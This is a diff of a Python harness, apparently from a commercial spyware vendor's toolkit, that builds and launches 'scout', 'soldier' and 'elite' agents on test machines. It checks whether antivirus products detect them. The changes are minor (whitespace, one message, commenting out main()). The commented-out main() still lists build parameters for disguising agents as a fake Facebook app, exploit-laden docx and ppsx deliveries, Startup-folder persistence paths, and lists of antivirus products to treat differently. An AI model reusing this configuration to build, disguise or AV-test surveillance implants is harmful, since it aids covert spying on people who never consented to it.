@@ -38,6 +38,7 @@ MOUSEEVENTF_CLICK = MOUSEEVENTF_LEFTDOWN + MOUSEEVENTF_LEFTUP
 #names = ['btplayerctrl', 'HydraDM', 'iFrmewrk', 'Toaster', 'rusb3mon', 'SynTPEnh', 'agent']
 #names = ['8169Diag', 'CCleaner', 'Linkman', 'PCSwift', 'PerfTune', 'SystemOptimizer', 'agent']
 names = ['ChipUtil', 'SmartDefrag', 'DiskInfo', 'EditPad', 'TreeSizeFree', 'bkmaker', 'agent']
+
 start_dirs = ['C:/Users/avtest/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup',
             'C:/Documents and Settings/avtest/Start Menu/Programs/Startup' ] #, 'C:/Users/avtest/Desktop']
 
@@ -213,7 +214,6 @@ class AgentBuild:
             subp = subprocess.Popen(exefile, shell=True)
             timestr2 = time.strftime("%y%m%d-%H%M%S", time.localtime(time.time()))
             logging.debug("### Completed launching %s with Popen - time: %s" % (exefile, timestr2))
-
 
             if not silent:
                 add_result("+ SUCCESS SCOUT EXECUTE")
@@ -449,7 +449,7 @@ class AgentBuild:
             if self.hostname in self.soldierlist:
                 add_result("+ SUCCESS SOLDIER BLACKLISTED (I'm doing an elite test but because the av is in soldierlist, I got a soldier update)")
             else:
-                add_result("+ FAILED ELITE UPGRADE")
+                add_result("+ FAILED ELITE UPGRADE (maybe server says this vm is soldier, but rite thinks it's elite)")
 
             logging.debug("- Uninstalling and closing instance: %s" % instance_id)
             self.uninstall(instance_id)
@@ -1084,119 +1084,119 @@ def build(args, report):
     return results, success, errors
 
 
-def main():
-    parser = argparse.ArgumentParser(description='AVMonitor avtest.')
-
-    #'elite'
-    parser.add_argument(
-        'action', choices=['scout', 'elite', 'internet', 'test', 'clean', 'pull'])
-    parser.add_argument('-p', '--platform', default='windows')
-    parser.add_argument('-b', '--backend')
-    parser.add_argument('-f', '--frontend')
-    parser.add_argument('-k', '--kind', choices=['silent', 'melt'])
-    parser.add_argument('-v', '--verbose', action='store_true', default=False, help="Verbose")
-
-    #parser.set_defaults(blacklist=blacklist)
-    #parser.set_defaults(platform_type=platform_type)
-
-    args = parser.parse_args()
-
-    #edit by ML
-    winhostname = socket.gethostname().lower()
-
-    if "winxp" in winhostname:
-        avname = winhostname.replace("winxp", "").lower()
-    elif "win7" in winhostname:
-        avname = winhostname.replace("win7", "").lower()
-    else:
-        avname = winhostname.replace("win8", "").lower()
-
-    platform_mobile = ["android", "blackberry", "ios"]
-
-
-    soldierlist = "adaware,iobit32,bitdef,bitdef15,comodo,fsecure,gdata,drweb,360cn5,kis32,avg,avg32,norman,avira,avira15".split(',')
-    #OLD
-    #soldierlist = "bitdef,comodo,gdata,drweb,360cn,kis32,avg,avg32,iobit32".split(',')
-    blacklist = "emsisoft,sophos,kis32".split(',')
-    demo = False
-
-    params = {}
-    params['blackberry'] = {
-        'platform': 'blackberry',
-        'binary': {'demo': demo},
-        'melt': {'appname': 'facebook',
-                 'name': 'Facebook Application',
-                 'desc': 'Applicazione utilissima di social network',
-                 'vendor': 'face inc',
-                 'version': '1.2.3'},
-        'package': {'type': 'local'}}
-    params['windows'] = {
-        'platform': 'windows',
-        'binary': {'demo': demo, 'admin': False},
-        'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
-        'sign': {}
-    }
-    params['android'] = {
-        'platform': 'android',
-        'binary': {'demo': demo, 'admin': False},
-        'sign': {},
-        'melt': {}
-    }
-    params['linux'] = {
-        'platform': 'linux',
-        'binary': {'demo': demo, 'admin': False},
-        'melt': {}
-    }
-    params['osx'] = {'platform': 'osx',
-                     'binary': {'demo': demo, 'admin': True},
-                     'melt': {}
-    }
-    params['ios'] = {'platform': 'ios',
-                     'binary': {'demo': demo},
-                     'melt': {}
-    }
-
-    params['exploit'] = {"generate":
-                             {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
-                              "exploit": "HT-2012-001",
-                              "melt": {"demo": False, "scout": True, "admin": False}}, "platform": "exploit",
-                         "deliver": {"user": "USERID"},
-                         "melt": {"combo": "txt", "filename": "example.txt", "appname": "agent.exe",
-                                  "input": "000"}, "factory": {"_id": "000"}
-    }
-
-    params['exploit_docx'] = {"generate":
-                                  {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
-                                   "exploit": "HT-2013-002",
-                                   "melt": {"demo": False, "scout": True, "admin": False}},
-                              "platform": "exploit", "deliver": {"user": "USERID"},
-                              "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
-                                       "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-    }
-    params['exploit_ppsx'] = {"generate":
-                                  {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
-                                   "exploit": "HT-2013-003",
-                                   "melt": {"demo": False, "scout": True, "admin": False}},
-                              "platform": "exploit", "deliver": {"user": "USERID"},
-                              "melt": {"filename": "example.ppsx", "appname": "APPNAME", "input": "000",
-                                       "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-    }
-    params['exploit_web'] = {"generate":
-                                 {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
-                                  "exploit": "HT-2013-002",
-                                  "melt": {"demo": False, "scout": True, "admin": False}},
-                             "platform": "exploit", "deliver": {"user": "USERID"},
-                             "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
-                                      "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-    }
-
-    p_t = "desktop"
-    if args.platform in platform_mobile:
-        p_t = "mobile"
-    build(args.action, args.platform, p_t, args.kind,
-          params[args.platform], args.backend,
-          args.frontend, blacklist, soldierlist, None)
-
-
-if __name__ == "__main__":
-    main()
+# def main():
+#     parser = argparse.ArgumentParser(description='AVMonitor avtest.')
+#
+#     #'elite'
+#     parser.add_argument(
+#         'action', choices=['scout', 'elite', 'internet', 'test', 'clean', 'pull'])
+#     parser.add_argument('-p', '--platform', default='windows')
+#     parser.add_argument('-b', '--backend')
+#     parser.add_argument('-f', '--frontend')
+#     parser.add_argument('-k', '--kind', choices=['silent', 'melt'])
+#     parser.add_argument('-v', '--verbose', action='store_true', default=False, help="Verbose")
+#
+#     #parser.set_defaults(blacklist=blacklist)
+#     #parser.set_defaults(platform_type=platform_type)
+#
+#     args = parser.parse_args()
+#
+#     #edit by ML
+#     winhostname = socket.gethostname().lower()
+#
+#     if "winxp" in winhostname:
+#         avname = winhostname.replace("winxp", "").lower()
+#     elif "win7" in winhostname:
+#         avname = winhostname.replace("win7", "").lower()
+#     else:
+#         avname = winhostname.replace("win8", "").lower()
+#
+#     platform_mobile = ["android", "blackberry", "ios"]
+#
+#
+#     soldierlist = "adaware,iobit32,bitdef,bitdef15,comodo,fsecure,gdata,drweb,360cn5,kis32,avg,avg32,norman,avira,avira15".split(',')
+#     #OLD
+#     #soldierlist = "bitdef,comodo,gdata,drweb,360cn,kis32,avg,avg32,iobit32".split(',')
+#     blacklist = "emsisoft,sophos,kis32".split(',')
+#     demo = False
+#
+#     params = {}
+#     params['blackberry'] = {
+#         'platform': 'blackberry',
+#         'binary': {'demo': demo},
+#         'melt': {'appname': 'facebook',
+#                  'name': 'Facebook Application',
+#                  'desc': 'Applicazione utilissima di social network',
+#                  'vendor': 'face inc',
+#                  'version': '1.2.3'},
+#         'package': {'type': 'local'}}
+#     params['windows'] = {
+#         'platform': 'windows',
+#         'binary': {'demo': demo, 'admin': False},
+#         'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
+#         'sign': {}
+#     }
+#     params['android'] = {
+#         'platform': 'android',
+#         'binary': {'demo': demo, 'admin': False},
+#         'sign': {},
+#         'melt': {}
+#     }
+#     params['linux'] = {
+#         'platform': 'linux',
+#         'binary': {'demo': demo, 'admin': False},
+#         'melt': {}
+#     }
+#     params['osx'] = {'platform': 'osx',
+#                      'binary': {'demo': demo, 'admin': True},
+#                      'melt': {}
+#     }
+#     params['ios'] = {'platform': 'ios',
+#                      'binary': {'demo': demo},
+#                      'melt': {}
+#     }
+#
+#     params['exploit'] = {"generate":
+#                              {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
+#                               "exploit": "HT-2012-001",
+#                               "melt": {"demo": False, "scout": True, "admin": False}}, "platform": "exploit",
+#                          "deliver": {"user": "USERID"},
+#                          "melt": {"combo": "txt", "filename": "example.txt", "appname": "agent.exe",
+#                                   "input": "000"}, "factory": {"_id": "000"}
+#     }
+#
+#     params['exploit_docx'] = {"generate":
+#                                   {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
+#                                    "exploit": "HT-2013-002",
+#                                    "melt": {"demo": False, "scout": True, "admin": False}},
+#                               "platform": "exploit", "deliver": {"user": "USERID"},
+#                               "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
+#                                        "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+#     }
+#     params['exploit_ppsx'] = {"generate":
+#                                   {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
+#                                    "exploit": "HT-2013-003",
+#                                    "melt": {"demo": False, "scout": True, "admin": False}},
+#                               "platform": "exploit", "deliver": {"user": "USERID"},
+#                               "melt": {"filename": "example.ppsx", "appname": "APPNAME", "input": "000",
+#                                        "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+#     }
+#     params['exploit_web'] = {"generate":
+#                                  {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
+#                                   "exploit": "HT-2013-002",
+#                                   "melt": {"demo": False, "scout": True, "admin": False}},
+#                              "platform": "exploit", "deliver": {"user": "USERID"},
+#                              "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
+#                                       "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+#     }
+#
+#     p_t = "desktop"
+#     if args.platform in platform_mobile:
+#         p_t = "mobile"
+#     build(args.action, args.platform, p_t, args.kind,
+#           params[args.platform], args.backend,
+#           args.frontend, blacklist, soldierlist, None)
+#
+#
+# if __name__ == "__main__":
+#     main()
